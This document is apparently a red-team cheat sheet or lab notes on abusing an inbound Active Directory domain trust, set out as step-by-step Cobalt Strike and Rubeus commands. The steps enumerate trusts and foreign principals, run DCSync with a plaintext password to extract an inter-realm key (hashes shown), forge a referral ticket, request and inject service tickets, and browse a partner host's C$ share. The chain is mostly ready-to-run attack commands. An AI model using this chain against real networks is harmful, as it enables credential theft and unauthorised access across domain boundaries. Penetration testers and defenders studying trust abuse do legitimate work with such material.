
| Value | Trust Direction                 |
| ----- | ------------------------------- |
| 0     | `TRUST_DIRECTION_DISABLED`      |
| 1     | `TRUST_DIRECTION_INBOUND`       |
| 2     | `TRUST_DIRECTION_OUTBOUND`      |
| 3     | `TRUST_DIRECTION_BIDIRECTIONAL` |

| Value | trustAttributes                      |
| ----- | ------------------------------------ |
| 1     | `TRUST_ATTRIBUTE_NON_TRANSITIVE`     |
| 4     | `TRUST_ATTRIBUTE_QUARANTINED_DOMAIN` |
| 8     | `TRUST_ATTRIBUTE_FOREST_TRANSITIVE`  |
| 32    | `TRUST_ATTRIBUTE_WITHIN_FOREST`      |
| 64    | `TRUST_ATTRIBUTE_TREAT_AS_EXTERNAL`  |

##### Inbound Trust Abuse

Enumerate the one-way trust
```powershell
ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatname
```

Enumerate the Foreign Security Principals Container.
```powershell
ldapsearch (objectClass=foreignSecurityPrincipal) --attributes cn,memberOf --hostname partner.com --dn DC=partner,DC=com
```

Enumerate interesting SID
```powershell
ldapsearch (objectSid=[SID])

ldapsearch (objectSid=S-1-5-21-3926355307-1661546229-813047887-6102)
```

Perform DCSync to obtain inter-realm key.
```powershell
make_token CONTOSO\dyork Passw0rd!
dcsync contoso.com CONTOSO\PARTNER$
rev2self

7dd5eff4dfa069406ade61cbf61f1f0b39049781179d89c7cef0eb57200526a3
77057e264522cbf4db45d6733b9167dc
```

Forge a referral ticket offline or online using the `/ldap` flag
```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /user:pchilds /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /id:1105 /groups:513,1106,6102 /service:krbtgt/partner.com /rc4:77057e264522cbf4db45d6733b9167dc /nowrap

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /user:pchilds /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /service:krbtgt/partner.com /rc4:77057e264522cbf4db45d6733b9167dc /ldap /nowrap
```

Use forged inter-realm ticket to request service tickets for the trusting domain
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/par-jmp-1.partner.com /dc:par-dc-1.partner.com /nowrap /ticket: 
```

Inject ticket into current session and verify
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:

run klist
ls \\par-jmp-1.partner.com\c$
```

